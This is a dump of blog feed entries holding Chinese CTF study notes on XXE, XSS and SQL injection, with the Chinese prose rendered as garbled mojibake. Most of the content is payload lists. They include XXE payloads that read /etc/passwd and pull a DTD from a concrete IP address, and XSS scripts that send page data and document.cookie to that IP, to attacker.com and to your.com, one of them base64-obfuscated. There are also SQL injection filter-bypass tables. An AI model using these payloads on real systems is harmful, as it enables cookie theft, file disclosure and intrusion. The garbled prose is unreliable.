<h2 id="1-xxeçš„å‰æ"><a href="#1-xxeçš„å‰æ" class="headerlink" title="1.xxeçš„å‰æ:"></a>1.xxeçš„å‰æ:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(false);    --å…è®¸åŠ è½½å¤–éƒ¨å®ä½“ï¼ˆXXEçš„å‰æï¼‰</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">---ä½¿ç”¨DOMè§£æXMLï¼Œå¼€å¯äº†å®ä½“æ›¿æ¢ï¼ˆLIBXML_NOENTï¼‰å’ŒDTDåŠ è½½ï¼ˆLIBXML_DTDLOADï¼‰ï¼Œè¿™æ­£æ˜¯XXEæ”»å‡»ç”Ÿæ•ˆçš„å…³é”®</span><br></pre></td></tr></table></figure>

<h2 id="2-å¸¸è§çš„æ”»å‡»æ–¹å¼"><a href="#2-å¸¸è§çš„æ”»å‡»æ–¹å¼" class="headerlink" title="2.å¸¸è§çš„æ”»å‡»æ–¹å¼:"></a>2.å¸¸è§çš„æ”»å‡»æ–¹å¼:</h2><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>æè¿°</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>ğŸ“ æœ¬åœ°æ–‡ä»¶è¯»å–</td>
<td>è¯»å–æ•æ„Ÿæ–‡ä»¶</td>
<td><code>file:///etc/passwd</code></td>
</tr>
<tr>
<td>ğŸŒ SSRF</td>
<td>è®¿é—®å†…ç½‘èµ„æº</td>
<td><code>http://127.0.0.1/admin</code></td>
</tr>
<tr>
<td>ğŸ’£ DoS</td>
<td>ç™¾ä¸‡ç¬‘æ”»å‡»å¯¼è‡´å†…å­˜çˆ†ç‚¸</td>
<td><code>&lt;!ENTITY a &quot;&amp;a;&amp;a;&amp;a;&quot;&gt;</code></td>
</tr>
<tr>
<td>ğŸ“¤ å¤–å¸¦</td>
<td>å°†æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨</td>
<td><code>http://attacker.com/?d=&amp;xxe;</code></td>
</tr>
<tr>
<td>ğŸ˜ˆ Blind-XXE</td>
<td>æ²¡æœ‰ç›´æ¥è¾“å‡ºï¼Œé€šè¿‡å›æ˜¾å¤–å¸¦</td>
<td>é…åˆ <code>&lt;!ENTITY xxe SYSTEM &quot;http://x.x.x.x:8080/?data=...&quot; &gt;</code></td>
</tr>
</tbody></table>
<h1 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h1><h2 id="1-ç›´æ¥"><a href="#1-ç›´æ¥" class="headerlink" title="1.ç›´æ¥:"></a>1.ç›´æ¥:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h2 id="2-æ•°æ®å¤–å¸¦"><a href="#2-æ•°æ®å¤–å¸¦" class="headerlink" title="2.æ•°æ®å¤–å¸¦:"></a>2.æ•°æ®å¤–å¸¦:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;   ---è¿™ä¸ªä½ç½®å¯ä»¥æ¢æˆphpä¼ªåè®®  </span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://139.224.54.229/xxe.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">  %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-ä¸€äº›ç»•è¿‡"><a href="#3-ä¸€äº›ç»•è¿‡" class="headerlink" title="3.ä¸€äº›ç»•è¿‡"></a>3.ä¸€äº›ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å¯ä»¥å¯¹æ•°æ®è¿›è¡ŒUTF-<span class="number">16</span>ç¼–ç ç»•è¿‡(ä½¿ç”¨python)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>xss</title>
    <url>/2025/06/02/ctfshow/xss/</url>
    <content><![CDATA[<h1 id="å¸¸è§è¿‡æ»¤"><a href="#å¸¸è§è¿‡æ»¤" class="headerlink" title="å¸¸è§è¿‡æ»¤:"></a>å¸¸è§è¿‡æ»¤:</h1><h2 id="å¦‚æœä½¿ç”¨äº†http-only"><a href="#å¦‚æœä½¿ç”¨äº†http-only" class="headerlink" title="å¦‚æœä½¿ç”¨äº†http-only:"></a>å¦‚æœä½¿ç”¨äº†http-only:</h2><h3 id="1-GETè¯·æ±‚å¤–å¸¦"><a href="#1-GETè¯·æ±‚å¤–å¸¦" class="headerlink" title="1.GETè¯·æ±‚å¤–å¸¦:"></a>1.GETè¯·æ±‚å¤–å¸¦:</h3><p>GETå¤–å¸¦ï¼š</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GETæ–¹å¼å¤–å¸¦æ¥å£è¿”å›çš„æ•°æ®</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;æ¥å£&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POSTå¤–å¸¦:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POSTæ–¹å¼å¤–å¸¦æ¥å£è¿”å›çš„æ•°æ®</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="comment">// å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨</span></span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr2.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;https://attacker.com/post&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-POSTè¯·æ±‚å¤–å¸¦"><a href="#2-POSTè¯·æ±‚å¤–å¸¦" class="headerlink" title="2.POSTè¯·æ±‚å¤–å¸¦:"></a>2.POSTè¯·æ±‚å¤–å¸¦:</h3><p>GETå¤–å¸¦ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. POSTè¯·æ±‚è¯»å–ç›®æ ‡æ¥å£å†…å®¹</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POSTå¤–å¸¦:</p>
<h1 id="åˆ©ç”¨æ‰‹æ³•"><a href="#åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•:"></a>åˆ©ç”¨æ‰‹æ³•:</h1><h2 id="1-xssåŸç†çš„åˆ†æ"><a href="#1-xssåŸç†çš„åˆ†æ" class="headerlink" title="1.xssåŸç†çš„åˆ†æ:"></a>1.xssåŸç†çš„åˆ†æ:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‘ç½‘ç«™æ³¨å…¥æ¶æ„JavaScriptä»£ç ï¼Œè®©åˆ«äººçš„æµè§ˆå™¨åœ¨å—ä¿¡ä»»çš„ç½‘é¡µä¸Šä¸‹æ–‡ä¸­â€œæ‰§è¡Œæ”»å‡»è€…çš„è„šæœ¬â€ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="2-æ£€æµ‹æ–¹å¼"><a href="#2-æ£€æµ‹æ–¹å¼" class="headerlink" title="2. æ£€æµ‹æ–¹å¼:"></a>2. æ£€æµ‹æ–¹å¼:</h2><table>
<thead>
<tr>
<th>åœºæ™¯&#x2F;è¯´æ˜</th>
<th>Payloadç¤ºä¾‹</th>
<th>å¤‡æ³¨&#x2F;å®æˆ˜æ•ˆæœ</th>
</tr>
</thead>
<tbody><tr>
<td>ç»å…¸å¼¹çª—</td>
<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>åˆ¤æ–­èƒ½å¦æ’å…¥åŸç”ŸJS</td>
</tr>
<tr>
<td>åŒå¼•å·é—­åˆ</td>
<td><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>ç”¨äºå‚æ•°è¢«åŒ…åœ¨å¼•å·é‡Œ</td>
</tr>
<tr>
<td>å•å¼•å·é—­åˆ</td>
<td><code>&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>imgæ ‡ç­¾onerror</td>
<td><code>&lt;img src=1 onerror=alert(1)&gt;</code></td>
<td>ç»•è¿‡éƒ¨åˆ†è¿‡æ»¤ï¼Œä½ç‰ˆæœ¬IEå¿…å¼¹çª—</td>
</tr>
<tr>
<td>svgæ ‡ç­¾onload</td>
<td><code>&lt;svg/onload=alert(1)&gt;</code></td>
<td>å¯¹svgæ”¯æŒè¾ƒå¼±ç«™ç‚¹ï¼Œèƒ½ç»•æ ‡ç­¾é™åˆ¶</td>
</tr>
<tr>
<td>bodyæ ‡ç­¾onload</td>
<td><code>&lt;body onload=alert(1)&gt;</code></td>
<td>HTMLä¸»ä½“æ³¨å…¥ç‚¹</td>
</tr>
<tr>
<td>inputæ ‡ç­¾onfocus</td>
<td><code>&lt;input autofocus onfocus=alert(1)&gt;</code></td>
<td>é¡µé¢æ’å…¥inputæ—¶æµ‹è¯•</td>
</tr>
<tr>
<td>aæ ‡ç­¾onclick</td>
<td><code>&lt;a href=&quot;#&quot; onclick=alert(1)&gt;ç‚¹æˆ‘&lt;/a&gt;</code></td>
<td>éœ€ç”¨æˆ·æ“ä½œ</td>
</tr>
<tr>
<td>scriptå—æ³¨å…¥</td>
<td><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>å°é—­scriptåå†æ³¨å…¥æ–°çš„</td>
</tr>
<tr>
<td>jsäº‹ä»¶å±æ€§ï¼ˆä¸‡èƒ½å‹ï¼‰</td>
<td><code>&lt;button onmouseover=alert(1)&gt;XSS&lt;/button&gt;</code></td>
<td>é¼ æ ‡äº‹ä»¶å‹ç»•è¿‡</td>
</tr>
<tr>
<td>htmlæ³¨é‡Šç©¿æ’</td>
<td><code>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</code></td>
<td>ç›²æµ‹æ³¨é‡Šå¤„ç†ä¸ä¸¥çš„æ¨¡æ¿</td>
</tr>
<tr>
<td>ç›²æ‰“å‹payload</td>
<td><code>&lt;img src=1 onerror=fetch(&#39;//ä½ çš„åŸŸå/log?c=&#39;+document.cookie)&gt;</code></td>
<td>æ— å›æ˜¾åœºæ™¯ï¼Œåå°æ—¥å¿—æ”¶é›†</td>
</tr>
<tr>
<td>åå°„æµ‹è¯•</td>
<td><code>&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;</code></td>
<td>æ–¹ä¾¿åŒºåˆ†å½“å‰ç«™ç‚¹</td>
</tr>
<tr>
<td>DOMå‹æµ‹è¯•</td>
<td><code>#&quot;&gt;&lt;script&gt;alert(document.location)&lt;/script&gt;</code></td>
<td>DOMæ‹¼æ¥ä½ç½®å¿…æµ‹</td>
</tr>
<tr>
<td>href&#x2F;jumpè·³è½¬å‹</td>
<td><code>javascript:alert(1)</code></td>
<td>æµ‹urlè·³è½¬ã€é“¾æ¥ã€æŒ‰é’®</td>
</tr>
</tbody></table>
<h2 id="3-å¸¸è§imgå›æµ"><a href="#3-å¸¸è§imgå›æµ" class="headerlink" title="3.å¸¸è§imgå›æµ:"></a>3.å¸¸è§imgå›æµ:</h2><h3 id="1-åˆ†ç±»"><a href="#1-åˆ†ç±»" class="headerlink" title="1.åˆ†ç±»:"></a>1.åˆ†ç±»:</h3><table>
<thead>
<tr>
<th>åœºæ™¯&#x2F;ç›®çš„</th>
<th>payloadç¤ºä¾‹</th>
<th>è¯´æ˜&#x2F;æ”»é˜²æŠ€å·§</th>
</tr>
</thead>
<tbody><tr>
<td>æ ‡å‡†æœ€å¸¸ç”¨</td>
<td><code>&lt;img src=&quot;http://your.com/xss.php?cookie=&quot;+document.cookie&gt;</code></td>
<td>ç®€å•ç›´è§‚ï¼Œå¾ˆå¤šåœºæ™¯å¯ç”¨</td>
</tr>
<tr>
<td>åˆ©ç”¨onerroräº‹ä»¶</td>
<td><code>&lt;img src=1 onerror=&quot;new Image().src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
<td>å…¼å®¹æ€§å¼ºï¼Œå¯é˜²æ­¢éƒ¨åˆ†srcè¿‡æ»¤</td>
</tr>
<tr>
<td>onerrorå¤šå‚æ•°</td>
<td><code>&lt;img src=x onerror=&quot;this.src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
<td>åˆ©ç”¨è‡ªèº«srcå±æ€§ï¼Œæ— éœ€newå¯¹è±¡</td>
</tr>
<tr>
<td>base64ç»•è¿‡</td>
<td><code>&lt;img src=1 onerror=&quot;new Image().src=atob(&#39;aHR0cDovL3lvdXIuY29tL3hzcw==&#39;)+document.cookie&quot;&gt;</code></td>
<td>é¿å…æ˜æ–‡URLè¢«è¿‡æ»¤</td>
</tr>
<tr>
<td>å¤šäº‹ä»¶è”åˆ</td>
<td><code>&lt;img src=1 onerror=&quot;document.body.appendChild(new Image()).src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
<td>å…¼å®¹éƒ¨åˆ†å†…è”è¿‡æ»¤</td>
</tr>
<tr>
<td>åˆ©ç”¨fetch</td>
<td><code>&lt;img src=1 onerror=&quot;fetch(&#39;http://your.com/xss.php?cookie=&#39;+document.cookie)&quot;&gt;</code></td>
<td>æŸäº›ç°ä»£æµè§ˆå™¨å¯ç”¨</td>
</tr>
<tr>
<td>ä¼ªè£…UAç­‰ä¿¡æ¯å›æµ</td>
<td><code>&lt;img src=&quot;http://your.com/xss.php?info=&quot;+navigator.userAgent+document.cookie&gt;</code></td>
<td>æºå¸¦æ›´å¤šä¿¡æ¯</td>
</tr>
<tr>
<td>GET+POSTè”åˆ</td>
<td><code>&lt;img src=1 onerror=&quot;var i=new Image();i.src=&#39;http://your.com/xss.php?c=&#39;+document.cookie&quot;&gt;</code></td>
<td>å¤šç§å˜é‡åï¼Œè§„é¿WAF</td>
</tr>
</tbody></table>
<h3 id="2-åŒºåˆ«"><a href="#2-åŒºåˆ«" class="headerlink" title="2.åŒºåˆ«:"></a>2.åŒºåˆ«:</h3><table>
<thead>
<tr>
<th>payloadç±»å‹</th>
<th>éšè”½æ€§</th>
<th>å…¼å®¹æ€§</th>
<th>æ˜¯å¦è·³è½¬</th>
<th>æ”»é˜²ç”¨é€”</th>
</tr>
</thead>
<tbody><tr>
<td>img+src</td>
<td>é«˜</td>
<td>å¾ˆé«˜</td>
<td>å¦</td>
<td>é¦–é€‰ï¼Œé€‚åˆæ‰€æœ‰åœºæ™¯</td>
</tr>
<tr>
<td>img+onerror</td>
<td>å¾ˆé«˜</td>
<td>æé«˜</td>
<td>å¦</td>
<td>ç»•è¿‡æ»¤</td>
</tr>
<tr>
<td>location.href</td>
<td>ä½</td>
<td>é«˜</td>
<td>æ˜¯</td>
<td>æµ‹è¯•&#x2F;ç›²æ‰“ä¸ºä¸»</td>
</tr>
<tr>
<td>fetch&#x2F;xmlhttp</td>
<td>ä¸­</td>
<td>ä¸­é«˜</td>
<td>å¦</td>
<td>ç°ä»£æµè§ˆå™¨ä¸ºä¸»</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlæ³¨å…¥</title>
    <url>/2025/06/02/ctfshow/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>æ‰§è¡Œé¡ºåº</p>
<table>
<thead>
<tr>
<th>é¡ºåº</th>
<th>å…³é”®å­—</th>
<th>å«ä¹‰ä¸æ”»é˜²è¦ç‚¹</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><code>FROM</code></td>
<td>ç¡®å®šè¡¨æˆ–å­æŸ¥è¯¢æ¥æºï¼ˆæ³¨å…¥ç‚¹å¸¸è§äºè¡¨åˆ«åã€å­æŸ¥è¯¢ï¼‰</td>
</tr>
<tr>
<td>2</td>
<td><code>JOIN</code> &#x2F; <code>ON</code></td>
<td>è”è¡¨æ¡ä»¶ï¼ˆé€»è¾‘å¯æ§æ—¶å¯ç”¨ UNION&#x2F;FUZZ è§¦å‘é”™è¯¯æˆ–ç›²æ³¨ï¼‰</td>
</tr>
<tr>
<td>3</td>
<td><code>WHERE</code></td>
<td>è¡Œçº§è¿‡æ»¤ï¼ˆå¸ƒå°”ç›²æ³¨&#x2F;æ—¶é—´ç›²æ³¨&#x2F;æŠ¥é”™æ³¨å…¥å¸¸é©»åœ°ï¼‰</td>
</tr>
<tr>
<td>4</td>
<td><code>GROUP BY</code></td>
<td>åˆ†ç»„ï¼Œå¸¸ä¸ <code>HAVING</code> é…åˆæ³¨å…¥</td>
</tr>
<tr>
<td>5</td>
<td><code>HAVING</code></td>
<td>åˆ†ç»„åçš„è¿‡æ»¤ï¼ˆç»•è¿‡ WAF æ›¿ä»£ WHEREï¼‰</td>
</tr>
<tr>
<td>6</td>
<td><code>SELECT</code></td>
<td>æŒ‡å®šæŸ¥è¯¢å­—æ®µï¼ˆå¯æ„é€  <code>select sleep(3)</code> æˆ– <code>select updatexml(...)</code> ç­‰ï¼‰</td>
</tr>
<tr>
<td>7</td>
<td><code>DISTINCT</code></td>
<td>å»é‡ï¼Œå¯¹ç»“æœå½±å“è¾ƒå¤§ï¼Œæ”»å‡»ä¸­ä¸å¸¸åˆ©ç”¨</td>
</tr>
<tr>
<td>8</td>
<td><code>ORDER BY</code></td>
<td>æ’åºï¼ˆå¸ƒå°”ç›²æ³¨ä¸­å¯ç”¨æ’åºæ¡ä»¶æ³„éœ²å·®å¼‚ï¼‰</td>
</tr>
<tr>
<td>9</td>
<td><code>LIMIT</code></td>
<td>é™åˆ¶è¿”å›æ•°é‡ï¼ˆé…åˆè”åˆæ³¨å…¥å¯ç”¨ï¼‰</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>å…³é”®å­—</th>
<th>æ”»å‡»å¸¸ç”¨ç‚¹</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>SELECT</code></td>
<td>æš´éœ²å­—æ®µã€æ„é€  payload</td>
<td><code>select user(),database()</code> ç­‰</td>
</tr>
<tr>
<td><code>FROM</code></td>
<td>å­æŸ¥è¯¢æ³¨å…¥ç‚¹ã€åº“åæ§åˆ¶</td>
<td>å­æŸ¥è¯¢ä¸­ <code>from(select(...))</code> å¸¸ç”¨</td>
</tr>
<tr>
<td><code>JOIN ON</code></td>
<td>æ„é€ é€»è¾‘ç»•è¿‡</td>
<td>rarely usedï¼Œä½†å¯é…åˆæ³¨å…¥</td>
</tr>
<tr>
<td><code>WHERE</code></td>
<td>ç›²æ³¨ã€æŠ¥é”™ä¸»æˆ˜åœº</td>
<td><code>WHERE 1=1 and updatexml(...)</code></td>
</tr>
<tr>
<td><code>GROUP BY</code></td>
<td>ä¸º <code>HAVING</code> ç»•è¿‡é“ºè·¯</td>
<td>ç»•è¿‡ <code>WHERE</code> å…³é”®è¯æ£€æµ‹</td>
</tr>
<tr>
<td><code>HAVING</code></td>
<td>æ›¿ä»£ WHERE</td>
<td>ä¾‹å¦‚ <code>HAVING 1=1</code> ç»•WAF</td>
</tr>
<tr>
<td><code>UNION</code></td>
<td>è”åˆæ³¨å…¥æ ¸å¿ƒ</td>
<td><code>UNION SELECT 1,2,3</code> çˆ†å­—æ®µ</td>
</tr>
<tr>
<td><code>ORDER BY</code></td>
<td>çŒœå­—æ®µæ•° &#x2F; è§¦å‘æ’åºç›²æ³¨</td>
<td><code>ORDER BY 1</code>ï¼Œå¤šç”¨äºå¸ƒå°”ç›²æ³¨</td>
</tr>
<tr>
<td><code>LIMIT</code></td>
<td>é™åˆ¶æ•°æ®å›æ˜¾</td>
<td>æ§åˆ¶æ•°æ®ç²¾åº¦ï¼Œé…åˆ <code>OFFSET</code></td>
</tr>
</tbody></table>
<h3 id="å¸¸è§è¿‡æ»¤ç»•è¿‡"><a href="#å¸¸è§è¿‡æ»¤ç»•è¿‡" class="headerlink" title="å¸¸è§è¿‡æ»¤ç»•è¿‡:"></a>å¸¸è§è¿‡æ»¤ç»•è¿‡:</h3><h4 id="1-å¯¹ç©ºæ ¼çš„ç»•è¿‡"><a href="#1-å¯¹ç©ºæ ¼çš„ç»•è¿‡" class="headerlink" title="1.å¯¹ç©ºæ ¼çš„ç»•è¿‡:"></a>1.å¯¹ç©ºæ ¼çš„ç»•è¿‡:</h4><p>ä¹Ÿå¯ä»¥ç”¨()æ‹¬å·ï¼Œç»•è¿‡ç©ºæ ¼</p>
<table>
<thead>
<tr>
<th>ç»•è¿‡æ–¹å¼</th>
<th>æ›¿ä»£è¡¨è¾¾</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>%09</code></td>
<td>åˆ¶è¡¨ç¬¦ï¼ˆTabï¼‰</td>
<td><code>select%09*%09from</code></td>
</tr>
<tr>
<td><code>%0a</code></td>
<td>æ¢è¡Œç¬¦ï¼ˆ\nï¼‰</td>
<td><code>select%0a*%0afrom</code></td>
</tr>
<tr>
<td><code>%0b</code></td>
<td>å‚ç›´åˆ¶è¡¨ç¬¦</td>
<td>æœ‰äº›è§£æå™¨å¯ç”¨</td>
</tr>
<tr>
<td><code>%0c</code></td>
<td>æ¢é¡µç¬¦</td>
<td>ç”¨å¾—å°‘ä½†æœ‰æ•ˆ</td>
</tr>
<tr>
<td><code>%0d</code></td>
<td>å›è½¦ç¬¦ï¼ˆ\rï¼‰</td>
<td>Windowså¸¸è§</td>
</tr>
<tr>
<td><code>/**/</code></td>
<td>SQLæ³¨é‡Š</td>
<td><code>select/**//*/**/from</code></td>
</tr>
<tr>
<td><code>+</code></td>
<td>URL ç¼–ç ä¸­ç©ºæ ¼</td>
<td><code>select+*+from</code>ï¼ˆä»…é™éƒ¨åˆ†ç¯å¢ƒï¼‰</td>
</tr>
<tr>
<td><code>/*!*/</code></td>
<td>MySQLç‰¹æœ‰æ³¨é‡Šæ‰§è¡Œ</td>
<td><code>select/*!00000*/from</code></td>
</tr>
<tr>
<td><code>\x0a</code>~&#96;\x0d&#96;</td>
<td>å­—èŠ‚çº§æ›¿ä»£</td>
<td>ç‰¹å®šè¯­è¨€è§£æå™¨æœ‰æ•ˆ</td>
</tr>
<tr>
<td><code>0x20</code></td>
<td>ç©ºæ ¼çš„ hex</td>
<td>æ•°æ®ä¸­æ‹¼æ¥æ—¶ç”¨</td>
</tr>
</tbody></table>
<h4 id="2-å¯¹â€“-å’Œ-çš„è¿‡æ»¤"><a href="#2-å¯¹â€“-å’Œ-çš„è¿‡æ»¤" class="headerlink" title="2.å¯¹â€“+å’Œ#çš„è¿‡æ»¤:"></a>2.å¯¹â€“+å’Œ#çš„è¿‡æ»¤:</h4><table>
<thead>
<tr>
<th>ç»•è¿‡æ–¹å¼</th>
<th>ç¤ºä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>%23</code></td>
<td><code>#</code> â†’ <code>%23</code></td>
<td>URL ç¼–ç </td>
</tr>
<tr>
<td><code>%2d%2d</code></td>
<td><code>--</code> â†’ <code>%2d%2d</code></td>
<td>URL ç¼–ç ç»•è¿‡</td>
</tr>
<tr>
<td>ç©ºæ ¼æ³¨é‡Šå˜ç§</td>
<td><code>--\n</code>, <code>--\r</code>, <code>--\t</code></td>
<td>é <code>--+</code> å†™æ³•å°è¯•</td>
</tr>
<tr>
<td>å­—ç¬¦æ‹†è§£</td>
<td><code>- -</code>, <code>-- </code></td>
<td>åˆ†éš”æˆ–åŒå¼•å·åŒ…å«å¹²æ‰°è¯†åˆ«</td>
</tr>
<tr>
<td>å¤šè¡Œæ³¨é‡Šç»ˆæ­¢</td>
<td><code>/* æ³¨é‡Š */</code></td>
<td>å®‰å…¨å¯é ï¼Œæ¨èä½¿ç”¨</td>
</tr>
<tr>
<td>å¤šä½™é€»è¾‘ç»“æŸ</td>
<td><code>&#39;or&#39;1&#39;=&#39;1&#39;</code></td>
<td>ç›´æ¥é—­åˆï¼Œæ— éœ€æ³¨é‡Š</td>
</tr>
<tr>
<td>â€“%0cæˆ–è€…â€“%01</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="3-å¯¹whereçš„æ›¿ä»£"><a href="#3-å¯¹whereçš„æ›¿ä»£" class="headerlink" title="3.å¯¹whereçš„æ›¿ä»£:"></a>3.å¯¹whereçš„æ›¿ä»£:</h4><h5 id="1-ä½¿ç”¨having"><a href="#1-ä½¿ç”¨having" class="headerlink" title="1.ä½¿ç”¨having :"></a>1.ä½¿ç”¨having :</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> user_count</span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> username</span><br><span class="line"><span class="keyword">HAVING</span> user_count <span class="operator">&gt;</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">è¡¨å <span class="keyword">group</span> <span class="keyword">by</span> æŸ¥è¯¢çš„æ•°æ® <span class="keyword">having</span> æ·»åŠ æ¡ä»¶ï¼Œåªè¿”å›ç¬¦åˆæ¡ä»¶çš„æ•°æ®</span><br><span class="line"></span><br></pre></td></tr></table></figure>

